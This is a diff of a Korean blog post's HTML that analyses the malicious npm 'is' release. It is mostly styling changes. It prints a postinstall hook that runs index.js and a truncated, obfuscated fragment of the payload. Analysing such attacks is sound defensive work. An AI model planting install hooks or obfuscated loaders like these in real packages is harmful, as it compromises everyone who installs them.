@@ -17,46 +17,391 @@
       "name": "1ilsang",
       "url": "https://1ilsang.dev"
     },
-    "url": "https://1ilsang.dev/posts/is-supply-chain-attack",
+    "url": "https://1ilsang.dev/post/is-supply-chain-attack",
     "keywords": ["nodejs", "javascript", "frontend", "developer"]
   }
 </script>
 <progress
   id="nav-progress"
-  class="[&amp;::-webkit-progress-bar]:bg-sub-blue fixed top-0 left-0 z-10 w-full h-[3px] appearance-none [&amp;::-webkit-progress-value]:bg-base-og"
+  class="[&amp;::-webkit-progress-bar]:bg-sub-blue fixed top-0 left-0 z-10 w-full h-[3px] appearance-none xl:right-0 xl:left-[calc((100vw-1280px)/2+256px)] xl:w-auto [&amp;::-webkit-progress-value]:bg-base-og"
   aria-label="페이지 읽기 진행률"
   value="0"
   max="1"
 ></progress>
 <nav
   aria-label="메인 네비게이션"
-  class="fixed z-40 flex flex-wrap w-full justify-between justify-items-center hover:animate-rainbow-water hover:bg-nav hover:bg-[length:400%_400%] shadow-nav shadow-lg"
+  class="fixed z-40 flex flex-wrap w-full justify-between justify-items-center max-xl:hover:animate-rainbow-water max-xl:hover:bg-nav max-xl:hover:bg-[length:400%_400%] xl:top-0 xl:left-0 xl:h-screen xl:w-[calc((100vw-1280px)/2+256px)] xl:flex-col xl:flex-nowrap xl:items-stretch xl:justify-start xl:border-r xl:border-base/40 xl:bg-sidebar xl:py-[40px] max-xl:shadow-nav max-xl:shadow-lg"
 >
-  <div class="tracking-tight mr-6 text-2xl font-bold my-2 ml-3.5">
-    <a class="hover:underline" href="/">1ilsang</a>
+  <div class="hidden h-full w-[216px] xl:mr-5 xl:ml-auto xl:flex xl:flex-col">
+    <div class="ml-3 mb-4 flex items-center">
+      <a
+        aria-label="About 페이지로 이동"
+        class="mr-2 block w-8 h-8 mt-2 xl:w-12 xl:h-12 xl:mt-0 xl:mr-1"
+        href="/about"
+        ><img
+          class="border border-solid rounded-full w-full h-full border-white-blue"
+          src="/images/chul.webp"
+          alt="1ilsang"
+      /></a>
+      <div class="flex min-w-0 flex-col items-start justify-center">
+        <div
+          class="tracking-tight mr-6 xl:mr-0 text-2xl font-bold my-2 ml-3.5 xl:m-0"
+        >
+          <a
+            class="xl:block xl:rounded-sm xl:border xl:border-transparent xl:py-2.5 xl:no-underline xl:transition-colors xl:hover:border-base/40 xl:hover:bg-base/10 xl:px-1 hover:no-underline"
+            href="/"
+            ><span class="flex items-center gap-3"
+              ><span class="flex flex-col"
+                ><span>1ilsang.dev</span
+                ><span class="whitespace-nowrap text-xs font-normal text-dark"
+                  >Software Engineer</span
+                ></span
+              ></span
+            ></a
+          >
+        </div>
+      </div>
+    </div>
+    <ul class="flex flex-col gap-1">
+      <li>
+        <div
+          class="tracking-tight mr-6 xl:mr-0 text-xl mt-2.5 xl:mt-0 xl:text-[1rem]"
+        >
+          <a
+            class="xl:block xl:rounded-sm xl:border xl:border-transparent xl:py-2.5 xl:no-underline xl:transition-colors xl:hover:border-base/40 xl:hover:bg-base/10 xl:px-3 hover:underline"
+            href="/"
+            ><span class="flex items-center gap-3"
+              ><svg
+                aria-hidden="true"
+                class="h-[18px] w-[18px] flex-none"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="1.7"
+              >
+                <path d="m3 11 9-8 9 8"></path>
+                <path d="M5 10v10h14V10M9 20v-6h6v6"></path></svg
+              ><span class=""><span>Home</span></span></span
+            ></a
+          >
+        </div>
+      </li>
+      <li>
+        <div
+          class="tracking-tight mr-6 xl:mr-0 text-xl mt-2.5 xl:mt-0 xl:text-[1rem]"
+        >
+          <a
+            class="xl:block xl:rounded-sm xl:border xl:border-transparent xl:py-2.5 xl:no-underline xl:transition-colors xl:hover:border-base/40 xl:hover:bg-base/10 xl:px-3 hover:underline"
+            href="/posts"
+            ><span class="flex items-center gap-3"
+              ><svg
+                aria-hidden="true"
+                class="h-[18px] w-[18px] flex-none"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="1.7"
+              >
+                <path d="M6 3h9l4 4v14H6z"></path>
+                <path d="M14 3v5h5M9 12h6M9 16h6"></path></svg
+              ><span class=""><span>Posts</span></span></span
+            ></a
+          >
+        </div>
+        <ul aria-label="포스트 카테고리" class="mt-0.5 ml-[21px] py-1 pl-3">
+          <li
+            class="relative before:absolute before:-left-3 before:top-0 before:w-px before:bg-base/50 after:absolute after:-left-3 after:top-1/2 after:h-px after:w-3 after:bg-base/50 before:h-full"
+          >
+            <a
+              aria-current="page"
+              class="group flex min-w-0 items-center gap-2.5 border px-3 py-2 text-[13px] transition-colors border-base/60 bg-base/20 text-white"
+              href="/posts/javascript"
+              ><svg
+                aria-hidden="true"
+                class="h-[18px] w-[18px] flex-none"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="1.7"
+              >
+                <path d="m9 7-5 5 5 5M15 7l5 5-5 5"></path></svg
+              ><span class="truncate">JavaScript</span></a
+            >
+          </li>
+          <li
+            class="relative before:absolute before:-left-3 before:top-0 before:w-px before:bg-base/50 after:absolute after:-left-3 after:top-1/2 after:h-px after:w-3 after:bg-base/50 before:h-full"
+          >
+            <a
+              class="group flex min-w-0 items-center gap-2.5 border px-3 py-2 text-[13px] transition-colors border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              href="/posts/rust"
+              ><svg
+                aria-hidden="true"
+                class="h-[18px] w-[18px] flex-none"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="1.7"
+              >
+                <circle cx="12" cy="12" r="5"></circle>
+                <path
+                  d="M12 3v2M12 19v2M3 12h2M19 12h2M5.6 5.6 7 7M17 17l1.4 1.4M18.4 5.6 17 7M7 17l-1.4 1.4"
+                ></path></svg
+              ><span class="truncate">Rust</span></a
+            >
+          </li>
+          <li
+            class="relative before:absolute before:-left-3 before:top-0 before:w-px before:bg-base/50 after:absolute after:-left-3 after:top-1/2 after:h-px after:w-3 after:bg-base/50 before:h-full"
+          >
+            <a
+              class="group flex min-w-0 items-center gap-2.5 border px-3 py-2 text-[13px] transition-colors border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              href="/posts/activity"
+              ><svg
+                aria-hidden="true"
+                class="h-[18px] w-[18px] flex-none"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="1.7"
+              >
+                <path d="M3 12h4l2-6 4 12 2-6h6"></path></svg
+              ><span class="truncate">Activity</span></a
+            >
+          </li>
+          <li
+            class="relative before:absolute before:-left-3 before:top-0 before:w-px before:bg-base/50 after:absolute after:-left-3 after:top-1/2 after:h-px after:w-3 after:bg-base/50 before:h-full"
+          >
+            <a
+              class="group flex min-w-0 items-center gap-2.5 border px-3 py-2 text-[13px] transition-colors border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              href="/posts/book"
+              ><svg
+                aria-hidden="true"
+                class="h-[18px] w-[18px] flex-none"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="1.7"
+              >
+                <path d="M4 5a3 3 0 0 1 3-2h5v17H7a3 3 0 0 0-3 2z"></path>
+                <path
+                  d="M20 5a3 3 0 0 0-3-2h-5v17h5a3 3 0 0 1 3 2z"
+                ></path></svg
+              ><span class="truncate">Book</span></a
+            >
+          </li>
+          <li
+            class="relative before:absolute before:-left-3 before:top-0 before:w-px before:bg-base/50 after:absolute after:-left-3 after:top-1/2 after:h-px after:w-3 after:bg-base/50 before:h-full"
+          >
+            <a
+              class="group flex min-w-0 items-center gap-2.5 border px-3 py-2 text-[13px] transition-colors border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              href="/posts/retrospect"
+              ><svg
+                aria-hidden="true"
+                class="h-[18px] w-[18px] flex-none"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="1.7"
+              >
+                <circle cx="12" cy="12" r="8"></circle>
+                <path d="M12 8v5l3 2M5 5 3 8"></path></svg
+              ><span class="truncate">Retrospect</span></a
+            >
+          </li>
+          <li
+            class="relative before:absolute before:-left-3 before:top-0 before:w-px before:bg-base/50 after:absolute after:-left-3 after:top-1/2 after:h-px after:w-3 after:bg-base/50 before:h-full"
+          >
+            <a
+              class="group flex min-w-0 items-center gap-2.5 border px-3 py-2 text-[13px] transition-colors border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              href="/posts/tool"
+              ><svg
+                aria-hidden="true"
+                class="h-[18px] w-[18px] flex-none"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="1.7"
+              >
+                <path
+                  d="M14 6a4 4 0 0 0-5 5L3 17l4 4 6-6a4 4 0 0 0 5-5l-3 3-4-4z"
+                ></path></svg
+              ><span class="truncate">Tool</span></a
+            >
+          </li>
+          <li
+            class="relative before:absolute before:-left-3 before:top-0 before:w-px before:bg-base/50 after:absolute after:-left-3 after:top-1/2 after:h-px after:w-3 after:bg-base/50 before:h-1/2"
+          >
+            <a
+              class="group flex min-w-0 items-center gap-2.5 border px-3 py-2 text-[13px] transition-colors border-transparent text-sub-blue hover:border-base/40 hover:bg-base/10 hover:text-white"
+              href="/posts/algorithm"
+              ><svg
+                aria-hidden="true"
+                class="h-[18px] w-[18px] flex-none"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="1.7"
+              >
+                <circle cx="6" cy="5" r="2"></circle>
+                <circle cx="18" cy="12" r="2"></circle>
+                <circle cx="6" cy="19" r="2"></circle>
+                <path
+                  d="M8 5h3a3 3 0 0 1 3 3v1M8 19h3a3 3 0 0 0 3-3v-1"
+                ></path></svg
+              ><span class="truncate">Algorithm</span></a
+            >
+          </li>
+        </ul>
+      </li>
+      <li>
+        <div
+          class="tracking-tight mr-6 xl:mr-0 text-xl mt-2.5 xl:mt-0 xl:text-[1rem]"
+        >
+          <a
+            class="xl:block xl:rounded-sm xl:border xl:border-transparent xl:py-2.5 xl:no-underline xl:transition-colors xl:hover:border-base/40 xl:hover:bg-base/10 xl:px-3 hover:underline"
+            href="/tags"
+            ><span class="flex items-center gap-3"
+              ><svg
+                aria-hidden="true"
+                class="h-[18px] w-[18px] flex-none"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="1.7"
+              >
+                <path d="M20 12 12 20 4 12V4h8z"></path>
+                <circle cx="9" cy="9" r="1.3"></circle></svg
+              ><span class=""><span>Tags</span></span></span
+            ></a
+          >
+        </div>
+      </li>
+      <li>
+        <div
+          class="tracking-tight mr-6 xl:mr-0 text-xl mt-2.5 xl:mt-0 xl:text-[1rem]"
+        >
+          <a
+            class="xl:block xl:rounded-sm xl:border xl:border-transparent xl:py-2.5 xl:no-underline xl:transition-colors xl:hover:border-base/40 xl:hover:bg-base/10 xl:px-3 hover:underline"
+            href="/about"
+            ><span class="flex items-center gap-3"
+              ><svg
+                aria-hidden="true"
+                class="h-[18px] w-[18px] flex-none"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="1.7"
+              >
+                <circle cx="12" cy="7" r="3"></circle>
+                <path d="M5 21v-2a7 7 0 0 1 14 0v2"></path></svg
+              ><span class=""><span>About</span></span></span
+            ></a
+          >
+        </div>
+      </li>
+    </ul>
+    <div class="mt-auto">
+      <button
+        type="button"
+        class="flex w-full cursor-pointer items-center gap-2 rounded-sm border border-base/40 px-3 py-2 text-left text-xs text-sub-blue transition-colors hover:border-base/70 hover:bg-base/10 hover:text-white focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-highlight"
+        aria-label="라이트 모드로 전환"
+      >
+        <svg
+          aria-hidden="true"
+          class="h-4 w-4 flex-none"
+          fill="none"
+          stroke="currentColor"
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          stroke-width="1.7"
+          viewBox="0 0 24 24"
+        >
+          <circle cx="12" cy="12" r="4"></circle>
+          <path
+            d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"
+          ></path></svg
+        ><span
+          >라이트<!-- -->
+          모드</span
+        >
+      </button>
+      <p class="mt-4 border-t border-base/40 pt-5 text-xs text-dark">
+        © 1ilsang
+      </p>
+    </div>
   </div>
-  <div class="flex">
-    <div class="tracking-tight mr-6 text-xl mt-2.5">
-      <a class="hover:underline" href="/posts">posts</a>
+  <div class="flex w-full justify-between xl:hidden">
+    <div
+      class="tracking-tight mr-6 xl:mr-0 text-2xl font-bold my-2 ml-3.5 xl:m-0"
+    >
+      <a
+        class="xl:block xl:rounded-sm xl:border xl:border-transparent xl:py-2.5 xl:no-underline xl:transition-colors xl:hover:border-base/40 xl:hover:bg-base/10 xl:px-3 hover:underline"
+        href="/"
+        ><span class="flex items-center gap-3"
+          ><span class=""><span>1ilsang</span></span></span
+        ></a
+      >
     </div>
-    <div class="tracking-tight mr-6 text-xl mt-2.5">
-      <a class="hover:underline" href="/tags">tags</a>
+    <div class="flex">
+      <div
+        class="tracking-tight mr-6 xl:mr-0 text-xl mt-2.5 xl:mt-0 xl:text-[1rem]"
+      >
+        <a
+          class="xl:block xl:rounded-sm xl:border xl:border-transparent xl:py-2.5 xl:no-underline xl:transition-colors xl:hover:border-base/40 xl:hover:bg-base/10 xl:px-3 hover:underline"
+          href="/posts"
+          ><span class="flex items-center gap-3"
+            ><span class=""><span>Posts</span></span></span
+          ></a
+        >
+      </div>
+      <div
+        class="tracking-tight mr-6 xl:mr-0 text-xl mt-2.5 xl:mt-0 xl:text-[1rem]"
+      >
+        <a
+          class="xl:block xl:rounded-sm xl:border xl:border-transparent xl:py-2.5 xl:no-underline xl:transition-colors xl:hover:border-base/40 xl:hover:bg-base/10 xl:px-3 hover:underline"
+          href="/tags"
+          ><span class="flex items-center gap-3"
+            ><span class=""><span>Tags</span></span></span
+          ></a
+        >
+      </div>
+      <a
+        aria-label="About 페이지로 이동"
+        class="mr-2 block w-8 h-8 mt-2 xl:w-12 xl:h-12 xl:mt-0 xl:mr-1"
+        href="/about"
+        ><img
+          class="border border-solid rounded-full w-full h-full border-white-blue"
+          src="/images/chul.webp"
+          alt="1ilsang"
+      /></a>
     </div>
-    <a
-      aria-label="About 페이지로 이동"
-      class="mr-2 block w-8 h-8 mt-2"
-      href="/about"
-      ><img
-        class="border border-solid rounded-full w-full h-full border-white-blue"
-        src="/images/chul.webp"
-        alt="1ilsang"
-    /></a>
   </div>
 </nav>
 <section
   id="main-content"
   tabindex="-1"
-  class="h-auto min-h-full max-w-(--breakpoint-md) py-20 md:py-28 mx-4 min-[790px]:m-auto print:py-0"
+  class="h-auto min-h-full max-w-(--breakpoint-md) py-20 md:py-28 xl:pt-20 xl:pb-24 mx-4 min-[790px]:m-auto print:py-0 xl:!pb-6"
 >
   <h1 class="text-4xl break-words md:text-6xl">
     is 패키지의 Supply Chain Attack 과정 분석
@@ -140,7 +485,7 @@
       </div>
       <h2
         id="들어가며"
-        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-[hsl(210deg_18%_87%_/100%)]"
+        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-base/50"
       >
         <a
           aria-hidden="true"
@@ -148,7 +493,7 @@
           href="#들어가며"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >들어가며
       </h2>
@@ -238,7 +583,7 @@
       </p>
       <h2
         id="tldr-무슨-일이-벌어졌나"
-        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-[hsl(210deg_18%_87%_/100%)]"
+        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-base/50"
       >
         <a
           aria-hidden="true"
@@ -246,7 +591,7 @@
           href="#tldr-무슨-일이-벌어졌나"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >TL;DR: 무슨 일이 벌어졌나?
       </h2>
@@ -302,7 +647,7 @@
       </ul>
       <h2
         id="공급망-공격이란"
-        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-[hsl(210deg_18%_87%_/100%)]"
+        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-base/50"
       >
         <a
           aria-hidden="true"
@@ -310,7 +655,7 @@
           href="#공급망-공격이란"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >공급망 공격이란?
       </h2>
@@ -361,7 +706,7 @@
       </ul>
       <h2
         id="메인테이너-계정-탈취-과정"
-        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-[hsl(210deg_18%_87%_/100%)]"
+        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-base/50"
       >
         <a
           aria-hidden="true"
@@ -369,7 +714,7 @@
           href="#메인테이너-계정-탈취-과정"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >메인테이너 계정 탈취 과정
       </h2>
@@ -452,7 +797,7 @@
       <p class="mt-4 mb-4">BOOM!</p>
       <h2
         id="공격-코드-분석"
-        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-[hsl(210deg_18%_87%_/100%)]"
+        class="font-semibold leading-snug pb-0.5 pt-6 mb-2 group text-3xl mt-12 border-b border-base/50"
       >
         <a
           aria-hidden="true"
@@ -460,7 +805,7 @@
           href="#공격-코드-분석"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >공격 코드 분석
       </h2>
@@ -488,7 +833,7 @@
           href="#1-패키지-설치와-postinstall"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >1. 패키지 설치와 postinstall
       </h3>
@@ -496,15 +841,15 @@
         <pre
           tabindex="0"
           data-language="json"
-          data-theme="material-theme-palenight"
-        ><code data-language="json" data-theme="material-theme-palenight" style="display:grid"><span data-line=""><span style="color:#676E95;font-style:italic">// is/package.json</span></span>
-<span data-line=""><span style="color:#89DDFF">{</span></span>
-<span data-line=""><span style="color:#89DDFF">  "</span><span style="color:#C792EA">name</span><span style="color:#89DDFF">"</span><span style="color:#89DDFF">:</span><span style="color:#89DDFF"> "</span><span style="color:#C3E88D">is</span><span style="color:#89DDFF">"</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#89DDFF">  "</span><span style="color:#C792EA">version</span><span style="color:#89DDFF">"</span><span style="color:#89DDFF">:</span><span style="color:#89DDFF"> "</span><span style="color:#C3E88D">5.0.0</span><span style="color:#89DDFF">"</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#89DDFF">  "</span><span style="color:#C792EA">scripts</span><span style="color:#89DDFF">"</span><span style="color:#89DDFF">:</span><span style="color:#89DDFF"> {</span></span>
-<span data-line=""><span style="color:#89DDFF">    "</span><span style="color:#FFCB6B">postinstall</span><span style="color:#89DDFF">"</span><span style="color:#89DDFF">:</span><span style="color:#89DDFF"> "</span><span style="color:#C3E88D">node index.js</span><span style="color:#89DDFF">"</span></span>
-<span data-line=""><span style="color:#676E95;font-style:italic">  // ...</span></span>
-<span data-line=""><span style="color:#89DDFF">}</span></span></code></pre>
+          data-theme="github-light material-theme-palenight"
+        ><code data-language="json" data-theme="github-light material-theme-palenight" style="display:grid"><span data-line=""><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#676E95;--shiki-dark-font-style:italic">// is/package.json</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">{</span></span>
+<span data-line=""><span style="--shiki-light:#005CC5;--shiki-dark:#89DDFF">  "</span><span style="--shiki-light:#005CC5;--shiki-dark:#C792EA">name</span><span style="--shiki-light:#005CC5;--shiki-dark:#89DDFF">"</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF"> "</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">is</span><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF">"</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#005CC5;--shiki-dark:#89DDFF">  "</span><span style="--shiki-light:#005CC5;--shiki-dark:#C792EA">version</span><span style="--shiki-light:#005CC5;--shiki-dark:#89DDFF">"</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF"> "</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">5.0.0</span><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF">"</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">,</span></span>
+<span data-line=""><span style="--shiki-light:#005CC5;--shiki-dark:#89DDFF">  "</span><span style="--shiki-light:#005CC5;--shiki-dark:#C792EA">scripts</span><span style="--shiki-light:#005CC5;--shiki-dark:#89DDFF">"</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF"> {</span></span>
+<span data-line=""><span style="--shiki-light:#005CC5;--shiki-dark:#89DDFF">    "</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFCB6B">postinstall</span><span style="--shiki-light:#005CC5;--shiki-dark:#89DDFF">"</span><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">:</span><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF"> "</span><span style="--shiki-light:#032F62;--shiki-dark:#C3E88D">node index.js</span><span style="--shiki-light:#032F62;--shiki-dark:#89DDFF">"</span></span>
+<span data-line=""><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#676E95;--shiki-dark-font-style:italic">  // ...</span></span>
+<span data-line=""><span style="--shiki-light:#24292E;--shiki-dark:#89DDFF">}</span></span></code></pre>
       </figure>
       <ol class="min-[790px]:ml-6 ml-4 list-decimal">
         <li class="my-1.25">사용자가 <code>npm i is</code>를 하게 되면</li>
@@ -523,7 +868,7 @@
           href="#2-동적-함수-선언과-실행"
           aria-label="이 섹션 링크"
           ><span
-            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-[#61768f] before:mr-2"
+            class="icon icon-link opacity-0 group-hover:opacity-100 ease-in-out transition-opacity duration-300 before:absolute before:w-[40px] before:left-[-25px] before:content-[&quot;⧉&quot;] before:text-sub-blue before:mr-2"
           ></span></a
         >2. 동적 함수 선언과 실행
       </h3>
@@ -531,23 +876,23 @@
         <pre
           tabindex="0"
           data-language="js"
-          data-theme="material-theme-palenight"
-        ><code data-language="js" data-theme="material-theme-palenight" style="display:grid"><span data-line=""><span style="color:#676E95;font-style:italic">// index.js</span></span>
-<span data-line=""><span style="color:#82AAFF">Function</span><span style="color:#BABED8">(</span></span>
-<span data-line=""><span style="color:#89DDFF">  '</span><span style="color:#C3E88D">of‌</span><span style="color:#89DDFF">'</span><span style="color:#89DDFF">,</span></span>
-<span data-line=""><span style="color:#89DDFF">  `</span><span style="color:#C3E88D">var throw‌‌‌‌‌‌‌‌‌‌‌‌‌,do‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌,public‌‌‌‌‌‌‌‌‌‌‌‌,case‌‌‌‌‌‌‌‌‌‌‌‌‌‌,new‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌,void‌‌‌‌‌‌‌‌‌‌‌‌‌‌,function‌‌‌‌‌‌‌‌‌‌,of‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌,var‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌,in‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌;function for‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌(throw‌‌‌‌‌‌‌‌‌‌‌‌‌,do‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌,public‌‌‌‌‌‌‌‌‌‌‌‌){for(public‌‌‌‌‌‌‌‌‌‌‌‌=0x0;public‌‌‌‌‌‌‌‌‌‌‌‌&lt;do‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌;public‌‌‌‌‌‌‌‌‌‌‌‌++)throw‌‌‌‌‌‌‌‌‌‌‌‌‌.push(throw‌‌‌‌‌‌‌‌‌‌‌‌‌.shift());return throw‌‌‌‌‌‌‌‌‌‌‌‌‌}</span></span>
-<span data-line=""><span style="color:#C3E88D">  const arguments‌‌‌‌‌‌‌‌‌=["</span><span style="color:#BABED8">\\</span><span style="color:#C3E88D">u006c</span><span style="color:#BABED8">\\</span><span style="color:#C3E88D">u0065</span><span style="color:#BABED8">\\</span><span style="color:#C3E88D">u006e</span><span style="color:#BABED8">\\</span></span>
-<span data-line=""><span style="color:#C3E88D">  ...</span></span>
-<span data-line=""><span style="color:#C3E88D">  arguments‌‌‌‌‌‌‌‌‌‌[new‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌(arguments‌‌‌‌‌‌‌‌‌[0x89])]||arguments‌‌‌‌‌‌‌‌‌‌)}</span></span>
-<span data-line=""><span style="color:#C3E88D">                          })();</span><span style="color:#89DDFF">`</span><span style="color:#89DDFF">,</span><span style="color:#676E95;font-style:italic"> // 약 8000 줄</span></span>
-<span data-line=""><span style="color:#BABED8">)(</span><span style="color:#89DDFF">{</span></span>
-<span data-line=""><span style="color:#BABED8">  get void‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌() </span><span style="color:#89DDFF">{</span></span>
-<span data-line=""><span style="color:#89DDFF;font-style:italic">    return</span><span style="color:#BABED8"> window</span><span style="color:#89DDFF">;</span></span>
-<span data-line=""><span style="color:#89DDFF">  },</span></span>
-<span data-line=""><span style="color:#BABED8">  get switch‌‌‌‌‌‌‌‌‌‌‌‌‌() </span><span style="color:#89DDFF">{</span></span>
-<span data-line=""><span style="color:#89DDFF;font-style:italic">    return</span><span style="color:#BABED8"> require</span><span style="color:#89DDFF">;</span></span>
-<span data-line=""><span style="color:#89DDFF">  },</span></span>
-<span data-line=""><span style="color:#89DDFF">}</span><span style="color:#BABED8">)</span><span style="color:#89DDFF">;</span></span></code></pre>
+          data-theme="github-light material-theme-palenight"
+        ><code data-language="js" data-theme="github-light material-theme-palenight" style="display:grid"><span data-line=""><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#676E95;--shiki-dark-font-style:italic">// index.js</span></span>
+<span data-line=""><span style="--shiki-light:#6F42C1;--shiki-dark:#82AAFF">Function</span><span style="--shiki-light:#24292E;--shiki-dark:#BABED8">(</span></span>
